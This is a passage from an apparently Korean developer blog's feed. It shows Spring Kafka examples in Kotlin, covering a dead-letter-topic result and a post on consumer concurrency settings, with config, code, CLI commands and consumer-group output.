&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;kafka-log-dirs.sh &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt; 
 &lt;span class=&quot;nt&quot;&gt;--bootstrap-server&lt;/span&gt; kafka:9092 &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt; 
 &lt;span class=&quot;nt&quot;&gt;--describe&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt; 
 &lt;span class=&quot;nt&quot;&gt;--topic-list&lt;/span&gt; user.DLT  
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;결과
    &lt;ul&gt;
      &lt;li&gt;컨슈머에서 acknowledgment.acknowledge() 실행 전에 에러 발생시키고&lt;br /&gt;
메세지를 생성해보면 3회 재시도 후 user.DLT로 전달된 것을 확인할 수 있다.&lt;/li&gt;
      &lt;li&gt;컨슈머 그룹 상태 조회
        &lt;div class=&quot;language-text highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;GROUP           TOPIC           PARTITION  CURRENT-OFFSET  LOG-END-OFFSET  LAG             CONSUMER-ID                                           HOST            CLIENT-ID  
user            user            2          27              27              0               consumer-user-9-8e8f02f8-574b-444e-9dbc-657097764957  /172.18.0.1     consumer-user-9  
user            user            1          80              80              0               consumer-user-8-6715d66b-a88a-48a8-8709-5cd9a13b28c6  /172.18.0.1     consumer-user-8  
user            user            0          34              34              0               consumer-user-10-41b4eacf-896b-429c-8d3c-d6e9c4bdec95 /172.18.0.1  
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;        &lt;/div&gt;
      &lt;/li&gt;
      &lt;li&gt;실험 대상 파티션은 0번으로 CURRENT-OFFSET과 LOG-END-OFFSET이 &lt;br /&gt;
동일해진 것을 확인할 수 있다.&lt;/li&gt;
      &lt;li&gt;user.DLT 토픽 구독 cli 화면에 “hello world message”가 출력되는 것을 &lt;br /&gt;
확인할 수 있다.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;</content><author><name></name></author><category term="Kafka" /><category term="kafka" /><category term="spring" /><category term="kotlin" /><summary type="html">개요 카프카 기본 설정은 오토 커밋이다. 이 경우, 컨슈머가 메시지를 실제로 처리했는지와 무관하게, 일정 시간이 지나면 자동으로 오프셋이 커밋된다. 그 결과 메세지가 유실될 수 있다. 이를 방지하기 위해 수동 커밋을 설정한다.</summary></entry><entry><title type="html">Spring Kafka 컨슈머 멀티스레드 처리 설정</title><link href="https://a3magic3pocket.github.io/posts/spring-kafka-multithreaded-consumer-config/" rel="alternate" type="text/html" title="Spring Kafka 컨슈머 멀티스레드 처리 설정" /><published>2025-04-11T22:31:49+09:00</published><updated>2025-04-11T22:31:49+09:00</updated><id>https://a3magic3pocket.github.io/posts/spring-kafka-multithreaded-consumer-config</id><content type="html" xml:base="https://a3magic3pocket.github.io/posts/spring-kafka-multithreaded-consumer-config/">&lt;h2 id=&quot;개요&quot;&gt;개요&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;Spring Kafka의 @KafkaListener 어노테이션에서 concurrency 속성을 설정하면,&lt;br /&gt;
리스너 컨테이너가 해당 수만큼의 스레드를 생성하여 &lt;br /&gt;
동일한 리스너 로직을 병렬로 실행하며 메시지를 처리한다.&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;가정&quot;&gt;가정&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;도커로 카프카 컨테이너 한 개를 띄운다.&lt;/li&gt;
  &lt;li&gt;스프링으로 카프카와 소통한다.&lt;/li&gt;
  &lt;li&gt;스프링 카프카 의존성 및 스프링 의존성 설치는 이미 된 상태이다.&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;설정&quot;&gt;설정&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;application.yml
    &lt;div class=&quot;language-yml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
9
10
11
12
13
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;na&quot;&gt;spring&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;  
  &lt;span class=&quot;na&quot;&gt;kafka&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;  
    &lt;span class=&quot;na&quot;&gt;bootstrap-servers&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;kafka:9092&quot;&lt;/span&gt;  
    &lt;span class=&quot;na&quot;&gt;producer&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;  
      &lt;span class=&quot;na&quot;&gt;key-serializer&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;org.apache.kafka.common.serialization.StringSerializer&lt;/span&gt;  
      &lt;span class=&quot;na&quot;&gt;value-serializer&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;org.springframework.kafka.support.serializer.JsonSerializer&lt;/span&gt;  
    &lt;span class=&quot;na&quot;&gt;consumer&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;  
      &lt;span class=&quot;na&quot;&gt;auto-offset-reset&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;latest&lt;/span&gt;  
      &lt;span class=&quot;na&quot;&gt;enable-auto-commit&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;true&lt;/span&gt;  
      &lt;span class=&quot;na&quot;&gt;key-deserializer&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;org.apache.kafka.common.serialization.StringDeserializer&lt;/span&gt;  
      &lt;span class=&quot;na&quot;&gt;value-deserializer&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;org.springframework.kafka.support.serializer.JsonDeserializer&lt;/span&gt;  
      &lt;span class=&quot;na&quot;&gt;properties&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;  
        &lt;span class=&quot;s&quot;&gt;spring.json.trusted.packages&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;*&quot;&lt;/span&gt;  
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;토픽 생성
    &lt;ul&gt;
      &lt;li&gt;partition 3개짜리 user 토픽을 생성한다.
        &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt; kafka-topics.sh &lt;span class=&quot;nt&quot;&gt;--create&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt; 
 &lt;span class=&quot;nt&quot;&gt;--bootstrap-server&lt;/span&gt; kafka:9092 &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt; 
 &lt;span class=&quot;nt&quot;&gt;--topic&lt;/span&gt; user &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt; 
 &lt;span class=&quot;nt&quot;&gt;--partitions&lt;/span&gt; 3  
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;        &lt;/div&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;컨슈머
    &lt;div class=&quot;language-kotlin highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
9
10
11
12
13
14
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;nd&quot;&gt;@Component&lt;/span&gt;  
&lt;span class=&quot;kd&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;UserConsumer&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;  
            
    &lt;span class=&quot;nd&quot;&gt;@KafkaListener&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;  
        &lt;span class=&quot;n&quot;&gt;topics&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;KafkaTopic&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;USER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;  
        &lt;span class=&quot;n&quot;&gt;groupId&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;user&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;  
        &lt;span class=&quot;n&quot;&gt;concurrency&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;3&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 리스너를 실행할 스레드 수  &lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;  
    &lt;span class=&quot;k&quot;&gt;fun&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;consume&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;record&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ConsumerRecord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;acknowledgment&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Acknowledgment&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;  
        &lt;span class=&quot;nc&quot;&gt;Thread&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;  
        &lt;span class=&quot;nf&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;record++&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;record&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;  
        &lt;span class=&quot;n&quot;&gt;acknowledgment&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;acknowledge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;  
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;  
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;  
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;프로듀서
    &lt;div class=&quot;language-kotlin highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;k&quot;&gt;package&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;com.example.demo.kafka.producer&lt;/span&gt;  
            
&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;com.example.demo.constant.KafkaTopic&lt;/span&gt;  
&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;org.springframework.kafka.core.KafkaTemplate&lt;/span&gt;  
&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;org.springframework.stereotype.Service&lt;/span&gt;  
            
            
&lt;span class=&quot;nd&quot;&gt;@Service&lt;/span&gt;  
&lt;span class=&quot;kd&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;UserProducer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;  
    &lt;span class=&quot;k&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;val&lt;/span&gt; &lt;span class=&quot;py&quot;&gt;kafkaTemplate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;KafkaTemplate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;  
&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;  
            
    &lt;span class=&quot;k&quot;&gt;fun&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;message&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;  
        &lt;span class=&quot;n&quot;&gt;kafkaTemplate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;KafkaTopic&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;USER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;message&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;  
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;  
            
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;  
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;컨트롤러
    &lt;div class=&quot;language-kotlin highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;k&quot;&gt;package&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;com.example.demo.controller&lt;/span&gt;  
            
&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;com.example.demo.kafka.producer.UserProducer&lt;/span&gt;  
&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;io.swagger.v3.oas.annotations.Operation&lt;/span&gt;  
&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;org.springframework.http.HttpStatus&lt;/span&gt;  
&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;org.springframework.http.MediaType&lt;/span&gt;  
&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;org.springframework.http.ResponseEntity&lt;/span&gt;  
&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;org.springframework.web.bind.annotation.GetMapping&lt;/span&gt;  
&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;org.springframework.web.bind.annotation.ResponseStatus&lt;/span&gt;  
&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;org.springframework.web.bind.annotation.RestController&lt;/span&gt;  
&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;java.io.IOException&lt;/span&gt;  
            
&lt;span class=&quot;nd&quot;&gt;@RestController&lt;/span&gt;  
&lt;span class=&quot;kd&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;UserController&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;  
    &lt;span class=&quot;k&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;val&lt;/span&gt; &lt;span class=&quot;py&quot;&gt;userProducer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;UserProducer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;  
&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;  
            
    &lt;span class=&quot;nd&quot;&gt;@Operation&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;  
        &lt;span class=&quot;n&quot;&gt;summary&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;user 메세지 생성 및 처리&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;  
        &lt;span class=&quot;n&quot;&gt;description&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;user 메세지 생성 및 처리&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;  
        &lt;span class=&quot;n&quot;&gt;tags&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;user&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;  
    &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;  
    &lt;span class=&quot;nd&quot;&gt;@ResponseStatus&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;HttpStatus&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;OK&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;  
    &lt;span class=&quot;nd&quot;&gt;@Throws&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;IOException&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;  
    &lt;span class=&quot;nd&quot;&gt;@GetMapping&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/user&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;produces&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;MediaType&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;APPLICATION_JSON_VALUE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;  
    &lt;span class=&quot;k&quot;&gt;fun&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ResponseEntity&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;  
            
        &lt;span class=&quot;n&quot;&gt;userProducer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;hello world message&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;  
            
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ResponseEntity&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;ok&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;body&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;  
            &lt;span class=&quot;s&quot;&gt;&quot;success&quot;&lt;/span&gt;  
        &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;  
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;  
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;  
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;실험&quot;&gt;실험&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;카프카 메세지 생성 및 소비 명령
    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;curl http://localhost:8080/user  
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;카프카 파티션에 할당된 스레드 확인
    &lt;ul&gt;
      &lt;li&gt;명령
        &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt; kafka-consumer-groups.sh &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt; 
 &lt;span class=&quot;nt&quot;&gt;--bootstrap-server&lt;/span&gt; kafka:9092 &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt; 
 &lt;span class=&quot;nt&quot;&gt;--describe&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt; 
 &lt;span class=&quot;nt&quot;&gt;--group&lt;/span&gt; user  
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;        &lt;/div&gt;
      &lt;/li&gt;
      &lt;li&gt;응답
        &lt;div class=&quot;language-text highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;GROUP TOPIC PARTITION CURRENT-OFFSET LOG-END-OFFSET LAG CONSUMER-ID HOST CLIENT-ID  
user user 0 8 8 0 consumer-user-10-8ae274db-3b0f-4cd2-bb7a-9dc0c5c5cfc9 /172.18.0.1 consumer-user-10  
user user 2 4 4 0 consumer-user-9-c4bda59a-ac70-41f4-8925-01497cb6202c /172.18.0.1 consumer-user-9  
user user 1 0 0 0 consumer-user-8-4e721ce9-b567-4f97-81c6-3f1877cbb76f /172.18.0.1 consumer-user-8  
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;        &lt;/div&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;결과
    &lt;ul&gt;
      &lt;li&gt;3개의 파티션 모두 다른 CUNSUMER-ID가 할당된 것을 볼 수 있다.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;의문1---하나의-파티션만-current-offset이-증가하는-이유&quot;&gt;의문1 - 하나의 파티션만 CURRENT-OFFSET이 증가하는 이유?&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;균일한 속도로 카프카 메세지를 생성하다보면&lt;br /&gt;
하나의 파티션만 CURRENT-OFFSET이 증가하는  것을 볼 수 있다.&lt;/li&gt;
  &lt;li&gt;이는 기본 파티션 분배 정책이 스티키(sticky) 때문이다.&lt;/li&gt;
